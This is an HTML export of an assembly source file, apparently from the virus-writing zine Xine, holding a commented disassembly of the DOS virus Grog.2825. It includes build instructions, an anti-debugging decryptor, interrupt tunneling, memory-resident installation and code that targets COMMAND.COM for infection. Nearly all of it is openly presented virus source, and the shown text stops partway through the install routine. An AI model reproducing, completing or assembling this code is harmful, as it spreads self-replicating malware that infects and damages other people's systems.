<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 307 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;                  Grog.2825</span><span class="sc0">
</span><span class="sc1">;                Disassembly by</span><span class="sc0">
</span><span class="sc1">;                 Darkman/29A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Grog.2825 is a 2825 bytes parasitic resident COM/EXE/Overlay virus. Infects</span><span class="sc0">
</span><span class="sc1">;   files at open file, close file, delete file, get or set file attributes,</span><span class="sc0">
</span><span class="sc1">;   load and/or execute program and extended open/create by prepending the virus</span><span class="sc0">
</span><span class="sc1">;   to the infected COM file and appending to the infected EXE/Overlay file.</span><span class="sc0">
</span><span class="sc1">;   Grog.2825 has an error handler, anti-tunneling, anti-debugging techniques,</span><span class="sc0">
</span><span class="sc1">;   interrupt stealth at interrupt 21h, filesize stealth, retro structures,</span><span class="sc0">
</span><span class="sc1">;   tunneling of interrupt 13h and interrupt 21h and is oligomorphic in file</span><span class="sc0">
</span><span class="sc1">;   using its internal oligomorphic engine. Grog.2825 is using the pointer to</span><span class="sc0">
</span><span class="sc1">;   address of interrupt 13h (disk) handler-, interrupt 21h (DOS functions) get</span><span class="sc0">
</span><span class="sc1">;   address of InDOS flag- and address of interrupt 40h (ROM BIOS diskette</span><span class="sc0">
</span><span class="sc1">;   handler relocated by hard disk BIOS) handler DOS exploits.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To compile Grog.2825 with Turbo Assembler v 4.0 type:</span><span class="sc0">
</span><span class="sc1">;     TASM /m GROG2825.ASM</span><span class="sc0">
</span><span class="sc1">;     TLINK /t /x GROG2825.OBJ</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">              </span><span class="sc1">; Origin of Grog.2825</span><span class="sc0">

</span><span class="sc5">code_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; SI = offset of interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI =   "    "      "       "     "</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = offset of interrupt 01h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = segment of interrupt 01h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">    </span><span class="sc1">; AX = offset of decryptor</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt offset 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = segment of decryptor</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt segment 01h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crypt_begin</span><span class="sc0">  </span><span class="sc1">; SI = offset of crypt_begin</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">          </span><span class="sc1">; Set trap flag</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (DX)</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of encrypted code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_loop</span><span class="sc0">

         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">; Terminate program</span><span class="sc0">

</span><span class="sc5">decryptor</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Anti-debugging decryptor</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DI = offset of decryptor loop</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e2h</span><span class="sc0">  </span><span class="sc1">; LOOP imm8 (opcode 0e2h)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_int20</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to test_int20</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Decryption algorithm</span><span class="sc0">
</span><span class="sc5">decrypt_algo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc1">;     "          "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store byte of decrypted code</span><span class="sc0">
</span><span class="sc5">decrypt_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_int20</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0cdh</span><span class="sc0">  </span><span class="sc1">; INT 20h (opcode 0cdh,20h)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decrypt_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to decrypt_exit</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">crypt_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">      </span><span class="sc1">; Correct stack pointer</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int01_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int01_addr</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">
</span><span class="sc5">virus_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8e47h</span><span class="sc0">        </span><span class="sc1">; Grog.2825 function</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">retro_struc</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; TbMem retro structures</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int40_addr</span><span class="sc4">],</span><span class="sc2">0ec59h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int40_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">0f000h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2e01h</span><span class="sc0">        </span><span class="sc1">; Set verify flag (on)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Zero DL</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get disk transfer area address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">install</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc0">      </span><span class="sc1">; DX = offset of dta</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Set disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_assign</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect_comma</span><span class="sc0">    </span><span class="sc1">; ASSIGN not installed? Jump to in...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">601h</span><span class="sc0">         </span><span class="sc1">; Get drive assignment table</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">105h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AL = the drive which C: is mappe...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Mappe drive C: to drive C:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">105h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Store which drive C: is mapped too</span><span class="sc0">
</span><span class="sc5">infect_comma</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">c__command_c</span><span class="sc0">     </span><span class="sc1">; DX = offset of c__command_c</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; Get file attributes</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">c__dos_comma</span><span class="sc0">     </span><span class="sc1">; DX = offset of c__dos_comma</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; Get file attributes</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_assign</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">set_dta_addr</span><span class="sc0">    </span><span class="sc1">; ASSIGN not installed? Jump to se...</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">105h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Store drive which C: is mapped to</span><span class="sc0">
</span><span class="sc5">set_dta_addr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Set disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus_exit</span><span class="sc0">

</span><span class="sc5">test_assign</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test if ASSIGN is installed</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">         </span><span class="sc1">; ASSIGN installation check</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; ASSIGN installed?</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Tunnel, allocate memory, move vi...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5500h</span><span class="sc0">        </span><span class="sc1">; COMMAND.COM interface</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">command_inst</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">      </span><span class="sc1">; Get address of InDOS flag</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">  </span><span class="sc1">; Store segment of DOS data segment</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tunneler</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc1">; Set interupt vector 01h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; Get interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; Set interrupt offset 21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">; Set interrupt segment 21h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt offset 20h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int20_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt segment 20h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int20_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_origin</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_origin</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">          </span><span class="sc1">; Set trap flag</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (AX)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4343h</span><span class="sc0">        </span><span class="sc1">; Unknown function</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">7b4h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ES:BX = pointer to address of in...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tunnel_seg</span><span class="sc4">],</span><span class="sc2">0f000h</span><span class="sc0"> </span><span class="sc1">; Store segment of interrupt 13h</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (AX)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Get status of last operation</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
